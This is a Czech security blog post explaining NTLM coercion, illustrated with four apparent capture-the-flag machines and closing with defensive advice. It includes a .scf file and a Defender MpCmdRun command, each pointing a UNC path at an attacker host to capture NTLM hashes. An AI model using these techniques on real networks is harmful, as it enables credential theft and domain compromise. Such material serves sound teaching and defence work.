---
layout: post
author: Tomáš Matějíček
title: "NTLM coercion a vynucená autentizace"
date: 2020-10-29
tags: ntlm active-directory windows smb relay coercion
---
## Úvod a kontext

V řadě Windows a Active Directory útoků není první cíl rovnou vzdálené spuštění kódu. Stačí přimět systém, službu nebo uživatele, aby se autentizoval proti útočníkovu serveru. Právě to je NTLM coercion: útočník nevymýšlí heslo ani neobchází login formulář, ale vytvoří situaci, ve které se cílový stroj sám přihlásí tam, kam neměl.

[Driver](/driver), [Intelligence](/intelligence), [Forest](/forest) a [APT](/apt) ukazují čtyři různé varianty stejného vzorce:

- jednou stačí `.scf` soubor a načtení ikony přes SMB,
- podruhé interní skript s `Invoke-WebRequest -UseDefaultCredentials`,
- potřetí PrivExchange a relay do LDAP,
- a počtvrté vynucený přístup stroje na UNC cestu a odchyt machine accountu.

Bezpečnostně je důležité, že samotná vynucená autentizace ještě není konec útoku. Je to primitivum. To, co přijde dál, může být:

- cracknutí hashe offline,
- relay na jinou službu,
- nebo přímé zneužití získané identity.

## Co přesně je coercion a co už ne

Termín "coercion" se často používá příliš volně. Prakticky se vyplatí oddělit tři kroky.

### 1. Vynucení autentizace

Útočník přiměje cílový systém, aby poslal NTLM autentizaci na útočníkův listener:

- přes SMB,
- přes HTTP,
- přes Exchange/LDAP tok,
- nebo jiný interní protokol.

To je samotný coercion.

### 2. Zachycení nebo relay

Jakmile autentizace dorazí na útočníkův server, lze ji:

- uložit a cracknout offline,
- nebo přeposlat dál na jinou službu jako relay.

To už je další fáze. Důležitá právě proto, že obrana proti coercion a obrana proti relay nejsou totožné.

### 3. Zneužití získané identity

Teprve nakonec přichází reálný dopad:

- WinRM jako `tony`,
- DCSync přes relayované LDAP oprávnění,
- nebo další laterální pohyb s uživatelem či machine accountem.

Když se tyto vrstvy neslijí dohromady, je mnohem snazší vysvětlit, co útok opravdu umožnilo a kde ho šlo zastavit.

## Nejběžnější způsoby, jak autentizaci vynutit

### Soubor nebo cesta, kterou Windows automaticky načte

Typickým příkladem je `.scf` soubor nebo UNC cesta na SMB share. Stačí, aby Windows chtěl:

- načíst ikonu,
- otevřít soubor,
- nebo se podívat na vzdálený obsah,

a už posílá NTLM handshake.

### Automatizační skript s implicitní důvěrou

Velmi častý je interní skript, který používá:

- `Invoke-WebRequest -UseDefaultCredentials`,
- přístup na SMB/HTTP pomocí systémového účtu,
- nebo jinou defaultní autentizaci "protože je to interní".

Takový script pak stačí nasměrovat na útočníkem kontrolovanou adresu.

### Služba, kterou lze přinutit k volání ven

PrivExchange a podobné techniky jsou pokročilejší varianta stejného principu. Služba sama o sobě důvěřuje tomu, že se má autentizovat v určitém interním toku. Útočník jen obrátí směr této důvěry a využije ji proti cíli.

## Jak tenhle vzorec vypadal v praxi

### Driver: `.scf` soubor a hash účtu `tony`

[Driver](/driver) je nejčistší ukázka coercion přes souborový formát. Po přihlášení do firmware portálu šlo nahrát `.scf` soubor s UNC cestou:

Prakticky k tomu, co přesně v tomhle místě dělá `Responder` a co už ne, viz i [Responder](/nastroje/responder).

```text
[Shell]
Command=2
IconFile=\\10.10.14.11\share\random.ico
[Taskbar]
Command=ToggleDesktop
```

Jakmile Windows potřeboval zobrazit ikonu, sáhl na SMB share útočníka a Responder zachytil NTLMv2 hash účtu `tony`. V tomhle bodě je důležité říct, co se stalo a co ne:

- coercion vytvořil odchozí autentizaci,
- Responder ji zachytil,
- a teprve cracknutí hashe vedlo k heslu `liltony` a následnému WinRM footholdu.

### Intelligence: `Invoke-WebRequest -UseDefaultCredentials`

[Intelligence](/intelligence) ukazuje stejný princip v mnohem nenápadnější podobě. Účet `Tiffany.Molina` mohl číst `downdetector.ps1`, skript, který pravidelně procházel DNS jména začínající na `web` a na každý záznam posílal:

```text
Invoke-WebRequest -UseDefaultCredentials
```

Jakmile šlo do DNS přidat vlastní `webthacker.intelligence.htb`, skript navázal HTTP spojení na útočníkův server a automaticky přibalil NTLM autentizaci uživatele `Ted.Graves`. Tady je dobře vidět, že coercion nemusí být "hackerský trik". Často je to jen provozní automatizace, která slepě věří internímu jménu.

### Forest: PrivExchange a relay do LDAP

[Forest](/forest) ukazuje pokročilejší doménovou variantu. Účet `svc-alfresco` sám o sobě nestačil k plné doménové kompromitaci, ale BloodHound ukázal cestu přes `Exchange Windows Permissions`. Přes PrivExchange se podařilo vynutit autentizaci, kterou šlo relayovat na LDAP a změnit oprávnění účtu tak, aby získal DCSync schopnost.

To je dobrá připomínka, že coercion nemusí končit u crackování hashe. Pokud protistrana dovolí relay, je možné z vynucené autentizace udělat rovnou změnu stavu v doméně.

### APT: machine account `APT$` a UNC cesta

[APT](/apt) přidává ještě jinou důležitou vrstvu: coercion nemusí získat jen lidský účet. Přes UNC cestu se podařilo přinutit obranný proces, aby sáhl na útočníkův share:

```text
cmd /C C:\Users\"All Users"\Microsoft\"Windows Defender"\platform\4.18.2010.7-0\X86\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.7\\hello\\win.exe
```

Responder tak zachytil NTLMv1 autentizaci machine accountu `APT$`. Po cracknutí už bylo možné pokračovat k dumpu doménových tajemství. Obranně je to zásadní lekce: machine account není "méně důležitý". V některých řetězcích rozhodne právě on.

## Kde se to často plete s jinými technikami

### Coercion není totéž co relay

Coercion znamená "přinutit někoho se autentizovat". Relay znamená "použít tuto autentizaci proti jiné službě". Forest potřeboval obojí. Driver jen coercion a cracknutí hashe.

### Coercion není totéž co UNC RFI nebo include

[Sniper](/sniper) dobře ukazuje příbuzný, ale jiný vzorec. UNC cesta tam vedla k vzdálenému includu PHP souboru a k vykonání kódu. To není coercion v úzkém slova smyslu. Je to jiná forma důvěry v síťovou cestu. Prakticky se vyplatí tyto kategorie nemíchat, i když používají podobný vstup.

### Zachycený hash ještě neznamená přístup

Na Driver vedl zachycený NTLMv2 až po cracknutí k WinRM. Na Intelligence zachycený hash `Ted.Graves` otevřel další krok, ale sám o sobě ještě nebyl admin. Skutečný dopad závisí na:

- typu účtu,
- síle hesla,
- povolení relay,
- a dostupných službách.

## Jak podobné příležitosti hledat po footholdu

Po prvním přístupu má smysl systematicky hledat věci, které používají implicitní autentizaci:

- skripty s `UseDefaultCredentials`,
- UNC cesty v konfiguracích,
- uploady dovolující `.scf` nebo jiné shell helper formáty,
- služby a workflow nad Exchange, spoolerem nebo antivirem,
- a interní DNS nebo naming logiku, kterou lze ovlivnit.

Praktická otázka zní: který proces na hostu nebo v doméně bude ochotný někam sáhnout "jen proto, že je to interní"?

## Obrana a bezpečnější návrh

### 1. Blokovat nejproblematičtější formáty a cesty

Uploady nemají přijímat `.scf` a podobné soubory, které vynucují odchozí SMB přístup. Stejně tak je potřeba omezit workflow, která pracují s neověřenými UNC cestami.

### 2. Nepoužívat implicitní autentizaci vůči dynamickým cílům

`Invoke-WebRequest -UseDefaultCredentials` nad DNS jménem, které může útočník ovlivnit, je prakticky pozvánka ke coercion. Pokud script někam volá automaticky, cíl musí být pevně kontrolovaný a autentizace výslovně promyšlená.

### 3. Tvrdě omezit NTLM relay

LDAP signing, channel binding a další obranné prvky nezabrání samotnému coercion, ale výrazně sníží hodnotu zachycené autentizace. Forest ukazuje, jak drahé je relay nechat projít.

### 4. Zbavit se NTLMv1 a hlídat machine accounty

APT dobře připomíná, že starší NTLM varianty a podceňované machine accounty zůstávají kritickou slabinou. Pokud jde machine account donutit k autentizaci a odpověď cracknout, dopad může být plně doménový.

### 5. Monitorovat nečekané odchozí SMB a HTTP autentizace

Z detekčního pohledu je podezřelé:

- když server sahá na externí SMB share kvůli ikoně,
- když interní skript navazuje HTTP s integrovanou autentizací mimo běžnou infrastrukturu,
- nebo když Exchange a jiné služby začnou komunikovat s nečekaným listenerem.

## Shrnutí klíčových poznatků

- NTLM coercion je technika, která přiměje systém nebo službu, aby se autentizovala proti útočníkovu serveru.
- Samotný coercion ještě není konec útoku. Následovat může cracknutí, relay nebo další laterální pohyb.
- Driver, Intelligence, Forest a APT ukazují čtyři různé varianty téhož problému: souborový formát, interní automatizaci, službu v AD a machine account workflow.

## Co si odnést do praxe

- Při obraně je potřeba oddělit tři otázky: co autentizaci vynutilo, co s ní útočník udělal dál a proč cílová identita měla takovou hodnotu.
- Nejnebezpečnější nejsou jen zjevné exploity. Často jde o běžný provozní detail: ikonka z UNC cesty, script s `UseDefaultCredentials` nebo pomocná doménová služba.
- Pokud systém důvěřuje tomu, že "interní cíl je automaticky bezpečný", je už jen krok od toho, aby se stejná důvěra obrátila proti němu.
